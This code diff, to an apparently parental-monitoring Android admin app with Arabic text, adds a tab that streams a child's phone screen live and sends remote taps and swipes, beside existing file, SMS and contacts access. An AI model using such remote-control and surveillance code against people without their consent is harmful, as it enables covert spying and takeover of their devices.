@@ -68,6 +68,13 @@ import androidx.media3.ui.PlayerView
 import java.io.File
 import java.io.FileOutputStream
 import androidx.compose.ui.window.DialogProperties
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.withContext
+import androidx.compose.foundation.gestures.detectTapGestures
+import androidx.compose.foundation.gestures.detectDragGestures
+import androidx.compose.ui.input.pointer.pointerInput
+import androidx.compose.ui.layout.onSizeChanged
+import androidx.compose.ui.unit.IntSize
 
 class MainActivity : ComponentActivity() {
     private val viewModel: AdminViewModel by viewModels()
@@ -1373,7 +1380,8 @@ fun DeviceCommandsTab(
                 CommandItemInfo("file_explorer", "مستكشف ملفات الهاتف", "استكشاف وتنزيل ملفات جهاز الطفل بالكامل", Icons.Default.FolderOpen, Color(0xFFFFD54F)),
                 CommandItemInfo("apps", "قائمة التطبيقات وحزمها", "الاطلاع وفلترة التطبيقات المنصبة على الهاتف للأمان", Icons.Default.Apps, Color(0xFFFF4081)),
                 CommandItemInfo("sms", "الرسائل وتنبيهات الأمان", "مزامنة الرسائل النصية والتنبيهات المكتشفة بالهاتف", Icons.Default.Sms, Color(0xFFFF9100)),
-                CommandItemInfo("contacts", "سجل جهات الاتصال", "عرض الأسماء والأرقام المسجلة في هاتف الطفل", Icons.Default.ContactPhone, Color(0xFF9155FF))
+                CommandItemInfo("contacts", "سجل جهات الاتصال", "عرض الأسماء والأرقام المسجلة في هاتف الطفل", Icons.Default.ContactPhone, Color(0xFF9155FF)),
+                CommandItemInfo("remote_control", "التحكم عن بعد (لمس)", "بث مباشر للشاشة مع إمكانية التحكم الكامل باللمس", Icons.Default.SettingsRemote, Color(0xFF2196F3))
             )
 
             cmdItems.forEach { cmd ->
@@ -1423,6 +1431,7 @@ fun DeviceCommandsTab(
                         "apps" -> "إدارة وجرد التطبيقات المثبتة"
                         "sms" -> "الأرشيف والرسائل وتنبيهات الأمان"
                         "contacts" -> "سجل جهات الاتصال"
+                        "remote_control" -> "التحكم عن بعد التفاعلي"
                         else -> "لوحة التحكم بالأمر"
                     },
                     color = Color.White,
@@ -1440,6 +1449,7 @@ fun DeviceCommandsTab(
                     "apps" -> InstalledAppsRequirementsPage(viewModel)
                     "sms" -> SmsAndSecurityAlertsTab(viewModel)
                     "contacts" -> ContactsTab(viewModel)
+                    "remote_control" -> RemoteControlTab(viewModel)
                 }
             }
         }
@@ -1808,6 +1818,137 @@ fun AudioRecordRequirementsPage(viewModel: AdminViewModel) {
         }
         
         Spacer(Modifier.height(80.dp))
+    }
+}
+
+@Composable
+fun RemoteControlTab(viewModel: AdminViewModel) {
+    val liveStreamState by viewModel.liveStreamState.collectAsState()
+    val isStreamingActive = liveStreamState?.isActive == true
+    var controlContainerSize by remember { mutableStateOf(IntSize.Zero) }
+
+    Column(
+        modifier = Modifier.fillMaxSize().padding(14.dp),
+        verticalArrangement = Arrangement.spacedBy(12.dp)
+    ) {
+        Card(
+            colors = CardDefaults.cardColors(containerColor = Color(0xFF161B22)),
+            border = BorderStroke(1.dp, if(isStreamingActive) Color(0xFF2196F3) else Color(0xFF30363D)),
+            modifier = Modifier.fillMaxWidth()
+        ) {
+            Column(modifier = Modifier.padding(14.dp)) {
+                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
+                    Text("التحكم التفاعلي باللمس", color = Color.White, fontSize = 13.sp, fontWeight = FontWeight.Bold)
+                    Text(if (isStreamingActive) "مراقب" else "غير متصل", color = if (isStreamingActive) Color(0xFF39D353) else Color(0xFFFF4081), fontSize = 11.sp)
+                }
+                Spacer(modifier = Modifier.height(10.dp))
+                
+                Box(
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .height(450.dp)
+                        .clip(RoundedCornerShape(8.dp))
+                        .background(Color.Black)
+                        .border(1.dp, Color(0xFF21262D))
+                        .onSizeChanged { controlContainerSize = it }
+                        .pointerInput(isStreamingActive) {
+                            if (!isStreamingActive) return@pointerInput
+                            detectTapGestures(
+                                onTap = { offset ->
+                                    if (controlContainerSize.width > 0 && controlContainerSize.height > 0) {
+                                        val normalizedX = (offset.x / controlContainerSize.width) * 100f
+                                        val normalizedY = (offset.y / controlContainerSize.height) * 100f
+                                        viewModel.sendRemoteClick(normalizedX, normalizedY)
+                                    }
+                                }
+                            )
+                        }
+                        .pointerInput(isStreamingActive) {
+                            if (!isStreamingActive) return@pointerInput
+                            var startPoint = Offset.Zero
+                            var endPoint = Offset.Zero
+                            detectDragGestures(
+                                onDragStart = { startPoint = it },
+                                onDragEnd = {
+                                    if (controlContainerSize.width > 0 && controlContainerSize.height > 0) {
+                                        val x1 = (startPoint.x / controlContainerSize.width) * 100f
+                                        val y1 = (startPoint.y / controlContainerSize.height) * 100f
+                                        val x2 = (endPoint.x / controlContainerSize.width) * 100f
+                                        val y2 = (endPoint.y / controlContainerSize.height) * 100f
+                                        
+                                        // Only send if it's a real swipe (not just a jittery tap)
+                                        val dist = kotlin.math.sqrt((startPoint.x - endPoint.x)*(startPoint.x - endPoint.x) + (startPoint.y - endPoint.y)*(startPoint.y - endPoint.y))
+                                        if (dist > 30) {
+                                            viewModel.sendRemoteSwipe(x1, y1, x2, y2)
+                                        }
+                                    }
+                                },
+                                onDrag = { change, dragAmount ->
+                                    change.consume()
+                                    endPoint = change.position
+                                }
+                            )
+                        },
+                    contentAlignment = Alignment.Center
+                ) {
+                    val bitmap by produceState<Bitmap?>(initialValue = null, liveStreamState?.image) {
+                        value = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) { liveStreamState?.toBitmap() }
+                    }
+                    if (isStreamingActive && bitmap != null) {
+                        Image(
+                            bitmap!!.asImageBitmap(), 
+                            null, 
+                            modifier = Modifier.fillMaxSize(), 
+                            contentScale = ContentScale.Fit
+                        )
+                    } else if (isStreamingActive) {
+                        CircularProgressIndicator(color = Color(0xFF2196F3))
+                    } else {
+                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                            Icon(Icons.Default.SettingsRemote, null, tint = Color(0xFF8B949E), modifier = Modifier.size(48.dp))
+                            Spacer(Modifier.height(8.dp))
+                            Text("البث والتحكم غير مفعل.", color = Color(0xFF8B949E), fontSize = 12.sp)
+                        }
+                    }
+                }
+                
+                Spacer(modifier = Modifier.height(16.dp))
+                
+                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(10.dp)) {
+                    Button(
+                        onClick = { viewModel.startLiveStream() }, 
+                        enabled = !isStreamingActive, 
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF238636)), 
+                        modifier = Modifier.weight(1f)
+                    ) {
+                        Icon(Icons.Default.PlayArrow, null, modifier = Modifier.size(18.dp))
+                        Spacer(Modifier.width(8.dp))
+                        Text("بدء العرض")
+                    }
+                    Button(
+                        onClick = { viewModel.stopLiveStream() }, 
+                        enabled = isStreamingActive, 
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFDA3633)), 
+                        modifier = Modifier.weight(1f)
+                    ) {
+                        Icon(Icons.Default.Stop, null, modifier = Modifier.size(18.dp))
+                        Spacer(Modifier.width(8.dp))
+                        Text("إيقاف")
+                    }
+                }
+                
+                if (isStreamingActive) {
+                    Spacer(Modifier.height(12.dp))
+                    Text(
+                        "استخدم اللمس للنقر على شاشة الطفل مباشرة. سيتم إرسال إحداثيات اللمس ونسبتها المئوية تلقائياً للتنفيذ.",
+                        color = Color(0xFF8B949E),
+                        fontSize = 11.sp,
+                        textAlign = TextAlign.Center,
+                        modifier = Modifier.fillMaxWidth()
+                    )
+                }
+            }
+        }
     }
 }
 
@@ -3572,20 +3713,30 @@ fun VideoPlayerDialog(
     onDownload: () -> Unit
 ) {
     val context = LocalContext.current
+    var isPreparing by remember { mutableStateOf(true) }
     val exoPlayer = remember {
-        ExoPlayer.Builder(context).build().apply {
+        ExoPlayer.Builder(context).build()
+    }
+
+    LaunchedEffect(videoBase64) {
+        withContext(Dispatchers.IO) {
             try {
                 val bytes = Base64.decode(videoBase64, Base64.DEFAULT)
-                val tempFile = File(context.cacheDir, "temp_video_play.mp4")
-                val fos = FileOutputStream(tempFile)
-                fos.write(bytes)
-                fos.close()
-                setMediaItem(Media3MediaItem.fromUri(tempFile.absolutePath))
-                prepare()
-                playWhenReady = true
+                val tempFile = File(context.cacheDir, "temp_video_play_${System.currentTimeMillis()}.mp4")
+                FileOutputStream(tempFile).use { out ->
+                    out.write(bytes)
+                }
+                withContext(Dispatchers.Main) {
+                    exoPlayer.setMediaItem(Media3MediaItem.fromUri(tempFile.absolutePath))
+                    exoPlayer.prepare()
+                    exoPlayer.playWhenReady = true
+                    isPreparing = false
+                }
             } catch (e: Exception) {
-                Toast.makeText(context, "خطأ في تشغيل الفيديو: ${e.message}", Toast.LENGTH_SHORT).show()
-                onDismiss()
+                withContext(Dispatchers.Main) {
+                    Toast.makeText(context, "خطأ في تجهيز الفيديو: ${e.message}", Toast.LENGTH_SHORT).show()
+                    onDismiss()
+                }
             }
         }
     }
@@ -3618,8 +3769,8 @@ fun VideoPlayerDialog(
                 ) {
                     Text("مشغل الفيديو", color = Color.White, fontWeight = FontWeight.Bold)
                     Row {
-                        IconButton(onClick = onDownload) {
-                            Icon(Icons.Default.Download, "تنزيل", tint = Color.White, modifier = Modifier.size(20.dp))
+                        IconButton(onClick = onDownload, enabled = !isPreparing) {
+                            Icon(Icons.Default.Download, "تنزيل", tint = if (isPreparing) Color.Gray else Color.White, modifier = Modifier.size(20.dp))
                         }
                         IconButton(onClick = onDismiss) {
                             Icon(Icons.Default.Close, "إغلاق", tint = Color.White, modifier = Modifier.size(20.dp))
@@ -3633,15 +3784,19 @@ fun VideoPlayerDialog(
                         .background(Color.Black),
                     contentAlignment = Alignment.Center
                 ) {
-                    AndroidView(
-                        factory = { ctx ->
-                            PlayerView(ctx).apply {
-                                player = exoPlayer
-                                useController = true
-                            }
-                        },
-                        modifier = Modifier.fillMaxSize()
-                    )
+                    if (isPreparing) {
+                        CircularProgressIndicator(color = Color(0xFF39D353))
+                    } else {
+                        AndroidView(
+                            factory = { ctx ->
+                                PlayerView(ctx).apply {
+                                    player = exoPlayer
+                                    useController = true
+                                }
+                            },
+                            modifier = Modifier.fillMaxSize()
+                        )
+                    }
                 }
             }
         }
